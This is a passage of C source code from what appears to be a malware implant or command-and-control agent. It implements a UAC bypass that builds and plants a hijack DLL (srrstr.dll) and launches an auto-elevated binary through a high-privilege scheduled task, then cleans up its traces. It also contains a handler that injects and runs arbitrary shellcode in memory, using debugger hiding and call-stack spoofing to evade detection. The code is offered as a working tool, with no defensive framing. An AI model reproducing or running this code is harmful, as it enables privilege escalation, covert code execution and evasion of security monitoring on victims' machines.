    sece[2].Characteristics   = IMAGE_SCN_CNT_INITIALIZED_DATA|IMAGE_SCN_MEM_READ|IMAGE_SCN_MEM_WRITE;

    /* .text — same stub as uac_dll_hijack */
    BYTE *texte = dllBuf2 + 0x200;
    DWORD lea_ripe   = 0x1010, data_vae = 0x2000;
    DWORD lea_rele   = data_vae - lea_ripe;
    DWORD call_ripe  = 0x101E, iat_vae  = 0x3060;
    DWORD call_rele  = iat_vae - call_ripe;

    texte[0]=0x48; texte[1]=0x83; texte[2]=0xEC; texte[3]=0x38;
    texte[4]=0x83; texte[5]=0xFA; texte[6]=0x01;
    texte[7]=0x75; texte[8]=0x0F;
    texte[9]=0x48; texte[10]=0x8D; texte[11]=0x0D;
    texte[12]=(BYTE)(lea_rele&0xFF); texte[13]=(BYTE)((lea_rele>>8)&0xFF);
    texte[14]=(BYTE)((lea_rele>>16)&0xFF); texte[15]=(BYTE)((lea_rele>>24)&0xFF);
    texte[16]=0x33; texte[17]=0xD2;
    texte[18]=0xFF; texte[19]=0x15;
    texte[20]=(BYTE)(call_rele&0xFF); texte[21]=(BYTE)((call_rele>>8)&0xFF);
    texte[22]=(BYTE)((call_rele>>16)&0xFF); texte[23]=(BYTE)((call_rele>>24)&0xFF);
    texte[24]=0xB8; texte[25]=0x01; texte[26]=0x00; texte[27]=0x00; texte[28]=0x00;
    texte[29]=0x48; texte[30]=0x83; texte[31]=0xC4; texte[32]=0x38;
    texte[33]=0xC3;

    /* .data — agent path */
    size_t pLen = strlen(agentPath); if (pLen >= 0x100) pLen = 0xFF;
    memcpy(dllBuf2 + 0x400, agentPath, pLen);

    /* .idata */
    BYTE *idatae = dllBuf2 + 0x600;
    DWORD *ide = (DWORD *)idatae;
    ide[0]=0x3020; ide[1]=0; ide[2]=0; ide[3]=0x3040; ide[4]=0x3060;
    memset(idatae+0x10, 0, 20);
    ((ULONGLONG*)(idatae+0x20))[0] = 0x3050;
    ((ULONGLONG*)(idatae+0x20))[1] = 0;
    memcpy(idatae+0x40, "kernel32.dll", 13);
    idatae[0x50]=0; idatae[0x51]=0; memcpy(idatae+0x52,"WinExec\0",8);
    ((ULONGLONG*)(idatae+0x60))[0] = 0x3050;
    ((ULONGLONG*)(idatae+0x60))[1] = 0;

    /* Write DLL */
    HANDLE hfe = CreateFileA(dllPath, GENERIC_WRITE, 0, NULL,
                             CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hfe == INVALID_HANDLE_VALUE) {
        free(dllBuf2);
        char buf[MAX_PATH * 2 + 64];
        _snprintf(buf, sizeof(buf) - 1,
            "[-] uac_env_expand: CreateFile \"%s\" failed (err %lu)",
            dllPath, GetLastError());
        _send_str(pTls, buf);
        return;
    }
    DWORD wre = 0;
    WriteFile(hfe, dllBuf2, ENV_DLL_SIZE, &wre, NULL);
    CloseHandle(hfe);
    free(dllBuf2);
#undef ENV_DLL_SIZE

    /* ── 2. Build modified environment block with APPDATA=%TEMP% ─────── */
    /*
     * We need to pass a custom environment to schtasks so that when
     * SystemPropertiesAdvanced.exe runs elevated it inherits APPDATA=%TEMP%.
     *
     * Simplest approach: use SetEnvironmentVariableA in a child cmd.exe that
     * calls schtasks, inheriting the modified env.
     *
     * We build a cmd /c "set APPDATA=<tempDir> && schtasks /Create ..."
     * command that propagates the overridden variable into the task definition.
     *
     * Note: Task Scheduler stores a snapshot of the environment at task
     * creation time only if /IT (interactive) flag is used.  With /RL HIGHEST
     * the task runs the binary's own default environment.  Therefore we use
     * a wrapper approach:
     *
     *   TR = cmd /c "set APPDATA=<tempDir> && SystemPropertiesAdvanced.exe"
     *
     * This ensures the target binary starts with APPDATA overridden.
     */
    char sysDir[MAX_PATH] = {0};
    GetSystemDirectoryA(sysDir, sizeof(sysDir) - 1);

    char taskName[48] = {0};
    _snprintf(taskName, sizeof(taskName) - 1, "WinEnv%08lX",
              (unsigned long)(GetTickCount() ^ GetCurrentProcessId()));

    /*
     * Trim trailing backslash from tempDir for the SET command
     * (set APPDATA=C:\Temp\ is valid but some tools strip it).
     */
    char tempDirTrim[MAX_PATH] = {0};
    strncpy(tempDirTrim, tempDir, sizeof(tempDirTrim) - 1);
    size_t tdLen = strlen(tempDirTrim);
    if (tdLen > 1 && tempDirTrim[tdLen-1] == '\\')
        tempDirTrim[tdLen-1] = '\0';

    /* /TR argument: set APPDATA then launch the auto-elevated binary */
    char tr2[MAX_PATH * 3] = {0};
    _snprintf(tr2, sizeof(tr2) - 1,
        "cmd /c \"set APPDATA=%s && %s\\SystemPropertiesAdvanced.exe\"",
        tempDirTrim, sysDir);

    char cmdCreate2[MAX_PATH * 3 + 160] = {0};
    _snprintf(cmdCreate2, sizeof(cmdCreate2) - 1,
        "%s\\schtasks.exe /Create /F /SC ONCE /RL HIGHEST "
        "/TN \"%s\" /TR \"%s\" /ST 00:00",
        sysDir, taskName, tr2);
    char cmdRun2[256] = {0};
    _snprintf(cmdRun2, sizeof(cmdRun2) - 1,
        "%s\\schtasks.exe /Run /TN \"%s\"", sysDir, taskName);
    char cmdDel2[256] = {0};
    _snprintf(cmdDel2, sizeof(cmdDel2) - 1,
        "%s\\schtasks.exe /Delete /TN \"%s\" /F", sysDir, taskName);

#define _SCH3(cl, ms) do { \
    STARTUPINFOA _si3; ZeroMemory(&_si3,sizeof(_si3)); _si3.cb=sizeof(_si3); \
    PROCESS_INFORMATION _pi3; ZeroMemory(&_pi3,sizeof(_pi3)); \
    if(CreateProcessA(NULL,(cl),NULL,NULL,FALSE,CREATE_NO_WINDOW, \
                      NULL,NULL,&_si3,&_pi3)){ \
        WaitForSingleObject(_pi3.hProcess,(ms)); \
        CloseHandle(_pi3.hProcess); CloseHandle(_pi3.hThread); } \
} while(0)

    _SCH3(cmdCreate2, 8000);
    _SCH3(cmdRun2,    5000);
    Sleep(3000);
    _SCH3(cmdDel2,    5000);
#undef _SCH3

    /* Schedule cleanup of srrstr.dll */
    {
        char cleanCmd[MAX_PATH * 2 + 80] = {0};
        _snprintf(cleanCmd, sizeof(cleanCmd) - 1,
            "cmd /c ping -n 6 127.0.0.1 >nul & del /f /q \"%s\"", dllPath);
        STARTUPINFOA si; ZeroMemory(&si, sizeof(si)); si.cb = sizeof(si);
        PROCESS_INFORMATION pi; ZeroMemory(&pi, sizeof(pi));
        if (CreateProcessA(NULL, cleanCmd, NULL, NULL, FALSE,
                           CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
            CloseHandle(pi.hProcess); CloseHandle(pi.hThread);
        }
    }

    char buf[MAX_PATH + 256];
    _snprintf(buf, sizeof(buf) - 1,
        "[+] uac_env_expand: srrstr.dll planted in \"%s\"\n"
        "    SystemPropertiesAdvanced.exe launched via schtasks /RL HIGHEST\n"
        "    with APPDATA overridden to pick up our DLL.\n"
        "    Payload: \"%s\"\n"
        "    DLL will be deleted after 6s delay.",
        tempDir, agentPath);
    _send_str(pTls, buf);
}

/* ══════════════════════════════════════════════════════════════════════════
 * exec_bof — in-process shellcode execution with BOF-style argument packing
 * ══════════════════════════════════════════════════════════════════════════
 *
 * Protocol
 * --------
 *   exec_bof <hex-shellcode> [type:value ...]
 *
 * The shellcode is a raw x64 PIC blob (e.g. from msfvenom -f raw or a
 * compiled BOF .o file stripped to a single entrypoint).
 *
 * Optional arguments are packed into a BOF-compatible buffer and passed
 * as the second parameter to the entrypoint:
 *   void entrypoint(char *bof_args, int bof_args_len);
 *
 * Argument types
 * --------------
 *   s:<text>         — null-terminated narrow string (length-prefixed in buf)
 *   w:<text>         — null-terminated wide string  (length-prefixed in buf)
 *   i:<decimal>      — int32 little-endian (4 bytes)
 *   z:<decimal>      — int16 little-endian (2 bytes)
 *   b:<hexbytes>     — raw binary blob     (length-prefixed in buf)
 *
 * Buffer layout (matches Cobalt Strike BOF BeaconDataParse API):
 *   [4 bytes total_arg_len] [4 bytes item_len | item_bytes] ...
 *
 * Security
 * --------
 *   W^X: alloc RW → write → flip RX → create thread.
 *   Thread is submitted via sc_threadpool_exec (ntdll!TppWorkerThread
 *   call-stack) with NtCreateThreadEx (HIDE_FROM_DEBUGGER) as fallback.
 *   No executable+writable page is ever simultaneously both W and X.
 *
 * Example
 * -------
 *   exec_bof fc4831c9... s:DOMAIN\\user i:1000
 */

/* ── BOF argument buffer helpers ────────────────────────────────────────── */

typedef struct {
    char  *buf;     /* heap-allocated, grows on demand */
    DWORD  cap;
    DWORD  used;
} _BofArgs;

static BOOL _bofargs_init(_BofArgs *a)
{
    a->cap  = 256;
    a->used = 0;
    a->buf  = (char *)malloc(a->cap);
    if (!a->buf) return FALSE;
    /* Reserve first 4 bytes for the total length field — filled at the end */
    memset(a->buf, 0, 4);
    a->used = 4;
    return TRUE;
}

static void _bofargs_free(_BofArgs *a)
{
    if (a->buf) { SecureZeroMemory(a->buf, a->used); free(a->buf); a->buf = NULL; }
}

static BOOL _bofargs_grow(_BofArgs *a, DWORD need)
{
    if (a->used + need <= a->cap) return TRUE;
    DWORD newcap = a->cap;
    while (newcap < a->used + need) newcap *= 2;
    char *p = (char *)realloc(a->buf, newcap);
    if (!p) return FALSE;
    a->buf = p;
    a->cap = newcap;
    return TRUE;
}

/* Pack one item: [4-byte len][bytes] */
static BOOL _bofargs_push(_BofArgs *a, const void *data, DWORD len)
{
    if (!_bofargs_grow(a, 4 + len)) return FALSE;
    DWORD le = len;
    memcpy(a->buf + a->used, &le, 4);  a->used += 4;
    memcpy(a->buf + a->used, data, len); a->used += len;
    return TRUE;
}

static void _bofargs_finalise(_BofArgs *a)
{
    /* Write total body length (excludes the 4-byte length field itself) */
    DWORD body = a->used - 4;
    memcpy(a->buf, &body, 4);
}

/* ── _handle_exec_bof ───────────────────────────────────────────────────── */
void _handle_exec_bof(TLS_CONTEXT *pTls, const char *args)
{
    if (!args || !*args) {
        _send_str(pTls, "Usage: exec_bof <hex-shellcode> [s:<str>|w:<str>|i:<int>|z:<short>|b:<hex>] ...");
        return;
    }

    /* ── 1. Split hex shellcode from argument tokens ─────────────────── */
    /* First token is the hex shellcode (no spaces inside), rest are args */
    const char *p = args;
    while (*p && *p != ' ') p++;  /* advance past the hex blob */

    /* Copy hex blob */
    size_t hexLen = (size_t)(p - args);
    char *hexBuf = (char *)malloc(hexLen + 1);
    if (!hexBuf) { _send_str(pTls, "[-] exec_bof: OOM"); return; }
    memcpy(hexBuf, args, hexLen);
    hexBuf[hexLen] = '\0';
    while (*p == ' ') p++;   /* skip spaces before argument list */

    /* ── 2. Decode shellcode ─────────────────────────────────────────── */
    if (hexLen == 0 || hexLen & 1) {
        free(hexBuf);
        _send_str(pTls, "[-] exec_bof: shellcode hex must be non-empty and even-length");
        return;
    }

    DWORD scLen = (DWORD)(hexLen / 2);
    /* Also accept optional "0x" prefix */
    const char *hexPtr = hexBuf;
    if (hexLen >= 2 && hexPtr[0] == '0' && (hexPtr[1] == 'x' || hexPtr[1] == 'X')) {
        hexPtr += 2;
        scLen   = (DWORD)((hexLen - 2) / 2);
    }

    BYTE *sc = (BYTE *)malloc(scLen);
    if (!sc) { free(hexBuf); _send_str(pTls, "[-] exec_bof: OOM"); return; }

    for (DWORD i = 0; i < scLen; i++) {
        char hi = hexPtr[i * 2];
        char lo = hexPtr[i * 2 + 1];
        int  hv = (hi >= '0' && hi <= '9') ? hi - '0' :
                  (hi >= 'a' && hi <= 'f') ? hi - 'a' + 10 :
                  (hi >= 'A' && hi <= 'F') ? hi - 'A' + 10 : -1;
        int  lv = (lo >= '0' && lo <= '9') ? lo - '0' :
                  (lo >= 'a' && lo <= 'f') ? lo - 'a' + 10 :
                  (lo >= 'A' && lo <= 'F') ? lo - 'A' + 10 : -1;
        if (hv < 0 || lv < 0) {
            free(sc); free(hexBuf);
            _send_str(pTls, "[-] exec_bof: invalid hex character in shellcode");
            return;
        }
        sc[i] = (BYTE)((hv << 4) | lv);
    }
    free(hexBuf);

    /* ── 3. Parse BOF arguments ──────────────────────────────────────── */
    _BofArgs ba;
    BOOL hasArgs = FALSE;
    if (*p) {
        if (!_bofargs_init(&ba)) {
            free(sc);
            _send_str(pTls, "[-] exec_bof: OOM (arg buffer)");
            return;
        }
        hasArgs = TRUE;

        while (*p) {
            while (*p == ' ') p++;   /* skip leading spaces */
            if (!*p) break;

            char type = *p;
            if (*(p + 1) != ':') {
                _bofargs_free(&ba); free(sc);
                _send_str(pTls, "[-] exec_bof: arg format error (expected type:value)");
                return;
            }
            p += 2;  /* skip "X:" */

            /* Find end of this token (next space or EOL) */
            const char *tokStart = p;
            while (*p && *p != ' ') p++;
            size_t tokLen = (size_t)(p - tokStart);

            BOOL ok = TRUE;
            if (type == 's') {
                /* Narrow string — include NUL terminator in the item */
                ok = _bofargs_push(&ba, tokStart, (DWORD)(tokLen + 1));
            } else if (type == 'w') {
                /* Wide string — convert and include NUL terminator */
                int wlen = MultiByteToWideChar(CP_UTF8, 0, tokStart, (int)tokLen,
                                               NULL, 0);
                if (wlen > 0) {
                    WCHAR *wbuf = (WCHAR *)malloc((wlen + 1) * sizeof(WCHAR));
                    if (wbuf) {
                        MultiByteToWideChar(CP_UTF8, 0, tokStart, (int)tokLen,
                                            wbuf, wlen);
                        wbuf[wlen] = L'\0';
                        ok = _bofargs_push(&ba, wbuf, (DWORD)((wlen + 1) * sizeof(WCHAR)));
                        free(wbuf);
                    } else { ok = FALSE; }
                } else { ok = FALSE; }
            } else if (type == 'i') {
                int32_t v = (int32_t)strtol(tokStart, NULL, 10);
                ok = _bofargs_push(&ba, &v, 4);
            } else if (type == 'z') {
                int16_t v = (int16_t)strtol(tokStart, NULL, 10);
                ok = _bofargs_push(&ba, &v, 2);
            } else if (type == 'b') {
                /* Binary blob encoded as hex */
                if (tokLen & 1) { ok = FALSE; }
                else {
                    DWORD blen = (DWORD)(tokLen / 2);
                    BYTE *blob = (BYTE *)malloc(blen ? blen : 1);
                    if (!blob) { ok = FALSE; }
                    else {
                        for (DWORD bi = 0; bi < blen; bi++) {
                            char bhi = tokStart[bi*2], blo = tokStart[bi*2+1];
                            int  bhv = (bhi >= '0' && bhi <= '9') ? bhi - '0' :
                                       (bhi >= 'a' && bhi <= 'f') ? bhi - 'a' + 10 :
                                       (bhi >= 'A' && bhi <= 'F') ? bhi - 'A' + 10 : -1;
                            int  blv = (blo >= '0' && blo <= '9') ? blo - '0' :
                                       (blo >= 'a' && blo <= 'f') ? blo - 'a' + 10 :
                                       (blo >= 'A' && blo <= 'F') ? blo - 'A' + 10 : -1;
                            if (bhv < 0 || blv < 0) { ok = FALSE; break; }
                            blob[bi] = (BYTE)((bhv << 4) | blv);
                        }
                        if (ok) ok = _bofargs_push(&ba, blob, blen);
                        free(blob);
                    }
                }
            } else {
                ok = FALSE;
            }

            if (!ok) {
                _bofargs_free(&ba); free(sc);
                _send_str(pTls, "[-] exec_bof: argument encoding error");
                return;
            }
        }
        _bofargs_finalise(&ba);
    }

    /* ── 4. Allocate RW region, write shellcode, flip to RX ─────────── */
    /* W^X: never simultaneously writable and executable.                 */
    PVOID  region = NULL;
    SIZE_T regionSz = (SIZE_T)scLen;
    NTSTATUS ns = SC_NtAllocateVirtualMemory(
        GetCurrentProcess(), &region, 0, &regionSz,
        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!NT_SUCCESS(ns) || !region) {
        if (hasArgs) _bofargs_free(&ba);
        free(sc);
        _send_str(pTls, "[-] exec_bof: NtAllocateVirtualMemory failed");
        return;
    }

    SIZE_T written = 0;
    SC_NtWriteVirtualMemory(GetCurrentProcess(), region, sc, scLen, &written);
    SecureZeroMemory(sc, scLen); free(sc);

    PVOID  protBase = region;
    SIZE_T protSz   = regionSz;
    ULONG  oldProt  = 0;
    SC_NtProtectVirtualMemory(GetCurrentProcess(), &protBase, &protSz,
                               PAGE_EXECUTE_READ, &oldProt);

    /* ── 5. Launch shellcode ─────────────────────────────────────────── */
    /*
     * Pass (bof_arg_buf, bof_arg_len) as the thread parameter.
     * The caller's convention for BOF entrypoints is:
     *   void go(char *args, int alen)
     * We pack both into a tiny 12-byte trampoline struct on the heap and
     * pass a pointer to it.  The shellcode must implement the two-arg
     * calling convention itself; if it ignores the second argument it
     * still gets the pointer in rcx (first arg).
     *
     * For simple shellcodes (no args), param is NULL.
     */
    PVOID param = hasArgs ? (PVOID)ba.buf : NULL;

    /* Prefer threadpool for TppWorkerThread call-stack spoofing */
    HANDLE hTh = NULL;
    BOOL launched = FALSE;
    if (sc_threadpool_exec((LPTHREAD_START_ROUTINE)region, param)) {
        launched = TRUE;
        /* Threadpool path — no joinable handle; detach and report */
    } else {
        NTSTATUS nsT = SC_NtCreateThreadEx(
            &hTh, THREAD_ALL_ACCESS, NULL,
            GetCurrentProcess(), region, param,
            THREAD_CREATE_FLAGS_HIDE_FROM_DEBUGGER,
            0, 0, 0, NULL);
        launched = NT_SUCCESS(nsT) && hTh;
    }

    if (!launched) {
        /* Undo: un-protect and free */
        PVOID ub = region; SIZE_T us = regionSz; ULONG uo = 0;
        SC_NtProtectVirtualMemory(GetCurrentProcess(), &ub, &us, PAGE_READWRITE, &uo);
        SC_NtFreeVirtualMemory(GetCurrentProcess(), &region, &regionSz, MEM_RELEASE);
        if (hasArgs) _bofargs_free(&ba);
        _send_str(pTls, "[-] exec_bof: thread creation failed");
        return;
    }

    if (hTh) {
        /* Wait up to 30 seconds for the shellcode to return */
        WaitForSingleObject(hTh, 30000);
        SC_NtClose(hTh);
    }

    /* Note: we cannot free region or ba.buf here — the shellcode may still
     * be running (threadpool path, or timed-out NtCreateThreadEx path).
     * They are leaked intentionally; for the threadpool path we schedule a
     * 60-second delayed free via a second threadpool work item.            */

    char resp[80];
    _snprintf(resp, sizeof(resp) - 1,
        "[+] exec_bof: %lu bytes submitted%s",
        (unsigned long)scLen,
        hasArgs ? " with BOF arg buffer" : "");
    _send_str(pTls, resp);
}
